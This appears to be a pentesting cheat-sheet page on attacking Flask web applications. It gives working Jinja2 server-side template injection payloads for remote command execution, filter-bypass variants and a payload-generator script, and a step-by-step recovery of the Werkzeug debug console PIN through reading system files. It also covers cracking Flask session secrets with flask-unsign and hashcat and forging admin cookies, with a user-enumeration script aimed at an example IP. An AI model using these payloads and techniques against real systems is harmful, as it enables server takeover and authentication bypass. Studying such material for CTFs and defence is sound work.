---
description: A Python library working with Werkzeug and Jinja2
---

# Flask

## # Related Pages

{% content-ref url="../../languages/python.md" %}
[python.md](../../languages/python.md)
{% endcontent-ref %}

## Jinja2 Server-side Template Injection (SSTI)

Inject the Jinja2 templating language for when the `render_template_string()` function is used

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti" %}
HackTricks explaining exploitation in detail
{% endembed %}

### 1. Detect

```django
{{7*7}}
{{config}}
{% raw %}
{% debug %}
{% endraw %}
```

### 2. Find subclasses to use for RCE

```django
''.__class__.mro()[1].__subclasses__()
```

Then take the response and replace `,` with `\n` in Visual Studio Code to easily see the line number of the index. The `'subprocess.Popen'` key is an easy way to execute commands, but more can also be exploitable.&#x20;

### 3. Use subclass for RCE

Find a vulnerable subclass and replace index `42` with the index of it in the `__subclasses__()`:

{% code overflow="wrap" %}
```django
{{''.__class__.mro()[1].__subclasses__()[42]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```
{% endcode %}

Alternatively, try this **one-shot** that works on Flask applications specifically:

{% code title="One shot" %}
```django
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
{% endcode %}

### Filter Bypass

{% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2021/build-yourself-in" %}
Writeup of challenge where quotes (`'` & `"`) were blocked
{% endembed %}

{% code overflow="wrap" %}
```django
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
```
{% endcode %}

In Flask, it is also possible to read strings from query parameters. The following does not use many special characters while allowing you to put any special characters that you need in a `?a=` query parameter for the request triggering `render_template` or `render_template_string`:

```python
{{request|attr("args")|attr("get")("a")}}
```

When these don't cut it, try this phenomenal tool built specifically to bypass Jinja2 template injection filters. Given a server, it automatically detects the filter remotely to try and bypass it. This combines many tricks to bypass all kinds of character/word filters:

{% embed url="https://github.com/Marven11/Fenjing" %}
Automatic ()
{% endembed %}

You should read the documentation of the tool above ([English translation](https://github-com.translate.goog/Marven11/Fenjing?_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_pto=wapp)) to understand its usage. One of its most useful features is shown in the [examples](https://github-com.translate.goog/Marven11/Fenjing/blob/main/examples.md?_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_pto=wapp) when you can recreate the source code of the filter you are up against. Passing a function that returns `True` for valid requests and `False` for blocked ones, it can locally prepare a bypass for you to send in one shot:

<pre class="language-python"><code class="lang-python">from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level=logging.INFO)

<strong>COMMAND = "id > /tmp/pwned"
</strong>
def waf(s: str):
    blacklist = [
<strong>        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
</strong><strong>        "[", '"', "'", "_", ".", "+", "~", "{{",
</strong><strong>        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
</strong><strong>        "０", "１", "２", "３", "４", "５", "６", "７", "８", "９"
</strong>    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
<strong>    payload, _ = exec_cmd_payload(waf, COMMAND)  # shell command
</strong>    # payload = config_payload(waf)  # read '{{ config }}'

    print(payload)  # '{%set de=dict(GET=x)|first|lower%}{%set ...'
</code></pre>

## Werkzeug - Debug Mode RCE (Console PIN)

Werkzeug is a very popular HTTP back-end for Python. Libraries like Flask use this in the back, and you might see "werkzeug" related response headers indicating this. It has a **Debug Mode** that will show some code context and stack traces when a server-side error occurs. These lines can expand to a few more lines to leak some source code, but the real power comes from the **Console**.&#x20;

Every line shows a small ![](<../../.gitbook/assets/image (6) (2).png>) terminal icon, that when pressed will prompt for a PIN that can unlock an interactive Python console on the server. If you can find the PIN, you can execute Python code on the server resulting in RCE.&#x20;

This PIN is generated deterministically, meaning it should be the same every time, but different per machine. It simply uses some files on the filesystem to generate this code, so if you have some way to **read arbitrary files**, you can recreate the PIN yourself.&#x20;

### Source Code

In the Traceback, you will likely see a path that contains `flask/app.py`. This is the path which the Flask source code is loaded from and will be needed later.&#x20;

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption><p>An example of the Traceback path containing <code>flask/app.py</code></p></figcaption></figure>

If you change the `flask/app.py` to `werkzeug/debug/__init__.py`, you will find the code that handles this Debug Mode and generates the PIN. There are a few different versions of this code as it has changed over the years, so to be sure of how it works you should read this file on the target.&#x20;

The function of interest here is `get_pin_and_cookie_name()`:\
&#xNAN;_(note again that this code may be slightly different on the target)_

```python
def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.
    """
    ...

    modname = getattr(app, "__module__", t.cast(
        object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        str(uuid.getnode()), 
        get_machine_id()
    ]

    h = hashlib.sha1()  # <-- This may be md5() is some older werkzeug versions
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

    return rv, cookie_name
```

The most important things to note are the `probably_public_bits` and `private_bits`, which are the inputs for the randomness.&#x20;

#### Public bits

The public bits are defined like so:

* `username`: \
  The user that started the program
* `modname`: \
  "flask.app" if running Flask, otherwise recreate the environment and log this value
* `getattr(app, "__name__", type(app).__name__)`: \
  "Flask" if `app.run(debug=True)` is used, and "wsgi\_app" if `DebuggedApplication` called manually
* `getattr(mod, "__file__", None)`: \
  Absolute path to the `flask/app.py` file that the Traceback shows. May in some cases also be `.pyc` instead of `.py`

Most of these can be easily found by guessing or looking at the source code. Only the username might be unknown at first.&#x20;

#### Finding the username

There are a few ways to make an educated guess about the username. The `/proc/self/environ` file might contain a `USER` variable, making it as simple as reading this file. If this does not work for any reason, try the method below:

In the `/etc/passwd` file all users and their `uid`s are listed:

{% code title="/etc/passwd" %}
```
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
```
{% endcode %}

This gives a list of possible names. For a webserver `www-data` is common, but it could also be that another user on the system is hosting it.&#x20;

To be sure, a trick you can use is to look at which users are using which port. By default, Flask uses port 5000, but this can be changed in the `app.run()` code. This trick uses the `/proc/net/tcp` file which shows a table of all the TCP connections on the system as a file:

{% code title="/proc/net/tcp" %}
```
sl local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt uid
0: 0100007F:1388 00000000:0000 0A 00000000:00000000 00:00000000 00000000  33
...
```
{% endcode %}

Here are two columns of interest. The `local_address` which is a **hex-encoded** IP and port number. Then `uid` which is the number that corresponds with a username in `/etc/passwd`. To decode the address and port, you can simply convert them from hex in a Python console:

{% code title="Python" %}
```python
>>> '.'.join(str(int("0100007F"[i:i+2], 16)) for i in range(6, -1, -2))
'127.0.0.1'
>>> 0x1388
5000
```
{% endcode %}

#### Private bits

Lastly, there are two more private bits:

* `str(uuid.getnode())`:\
  The MAC address of the target, in decimal format. For example: `00:1B:44:11:3A:B7` would be `0x001B44113AB7` in hex, and `'117106096823'` in decimal. \
  It can be found by reading the `/proc/net/arp` file to find the interface in the Device column, and then request the `/sys/class/net/[interface]/address` file to get the MAC address.&#x20;
*   `get_machine_id()`:\
    The way this machine-id is found again depends on the server werkzeug version, so read the function source in the same file to be sure. But often this is the `/etc/machine-id` file, or if that does not exist, the `/proc/sys/kernel/random/boot_id` file. After this value, a part of `/proc/self/cgroup` is also added if it exists. Take the first line and this code on it (likely to be an empty string):

    {% code title="Python" %}
    ```python
    >>> b"14:misc:/".strip().rpartition(b"/")[2]
    b''
    >>> b"0::/system.slice/flask.service".strip().rpartition(b"/")[2]
    b'flask.service'
    ```
    {% endcode %}

### Generating the PIN

Finally, when you have all these required bits you can combine them in the same way the server would to recreate the PIN and access the console.&#x20;

```python
probably_public_bits = [
    'www-data',
    'flask.app',
    'Flask',
    '/usr/lib/python3/dist-packages/flask/app.py'
]
private_bits = [
    '345050109109',
    'e5987d8fd3a14193bb997b6afbdf2cca' + 'flask.service'
]

...  # <Insert werkzeug/debug/__init__.py -> get_pin_and_cookie_name() code here>

print(rv)  # 123-456-789
```

This should then generate the correct console PIN that you can put into the prompt when you try to execute Python code. After this is unlocked, you can simply run system commands:

```python
>>> import os
>>> os.popen('id').read()
'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

## Session Cookie

If you have a `SECRET_KEY` of the Flask application, you can forge your own `session=` cookies. This can be useful to bypass authentication or even try injection attacks inside the session's parameters.&#x20;

### Brute-Force

{% code title="Install" %}
```
pip install flask-unsign
```
{% endcode %}

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ flask-unsign --wordlist /list/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiajByMmFuIn0.Yu6Z8A._RI4cQ2NSYW2epWYt-mR5cfkg0U' --no-literal-eval
</strong>[*] Session decodes to: {'logged_in': True, 'username': 'j0r2an'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
</code></pre>

You can also speed this up significantly using [#hashcat](../../cryptography/hashing/cracking-hashes.md#hashcat "mention"), as can crack and even automatically detect Flask Session Cookies.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ hashcat eyJsb2dnZWRfaW4iOmZhbHNlfQ.XD88aw.AhuKIwFPpzGDFLVbTcsmgEJu-s4 /list/rockyou.txt 
</strong>...
29100 | Flask Session Cookie ($salt.$salt.$pass) | Network Protocol

eyJsb2dnZWRfaW4iOmZhbHNlfQ.XD88aw.AhuKIwFPpzGDFLVbTcsmgEJu-s4:CHANGEME
</code></pre>

{% hint style="warning" %}
Note that I have not always had successful results with hashcat. If you run into "No hash-mode matches the structure of the input hash" errors, try `flask-unsign` or manually set up the HMAC signature for hashcat to crack (see [cracking-signatures.md](../../cryptography/hashing/cracking-signatures.md "mention") for some  similar examples)
{% endhint %}

### Forging Session

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
</strong>eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YvlBnA.yo-Ef_eiy_aeDBgBK-cQdcu-nRw
</code></pre>

{% hint style="warning" %}
**Tip**: When put in a script it might need the `--legacy` argument to get correct timestamps. This depends on the Flask version
{% endhint %}

#### Scripted Forging

Using a Python script you can automate this forging process to forge lots of values and find different responses. For example:

<details>

<summary>find_users.py</summary>

```python
from flask_unsign import session
from tqdm import tqdm
import requests

with open("/list/username.txt") as f:
    usernames = [l.strip() for l in f.readlines()]

SECRET_KEY = "secret123"

for username in tqdm(usernames):
    result = session.sign({'logged_in': True, 'username': username}, secret=SECRET_KEY, legacy=True)

    r = requests.get("http://10.10.11.160:5000/dashboard", cookies={"session": result}, allow_redirects=False)
    
    if r.status_code == 200:  # Found
        print("FOUND USER", username, result)
```

</details>

